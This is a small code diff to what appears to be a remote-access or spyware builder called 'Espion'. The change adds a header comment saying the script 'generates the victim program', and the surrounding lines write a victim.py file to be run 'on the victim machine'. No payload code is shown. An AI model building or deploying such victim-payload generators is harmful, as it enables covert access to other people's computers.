@@ -1,3 +1,6 @@
+# Designed by Anurag.R.Simha.
+# Generates the victim program.
+
 import sys
 import socket
 import os
@@ -22,6 +25,7 @@ if('2' in sys.version[0:1]):
                 victim_file.close()
                 print("\nEspion has written a python file to %s titled %s. Run this file on the victim machine.\n"%(os.getcwd(), "victim.py"))
                 break
+
 elif('3' in sys.version[0:1]):
     title = open("title.txt", "r")
     print(title.read())
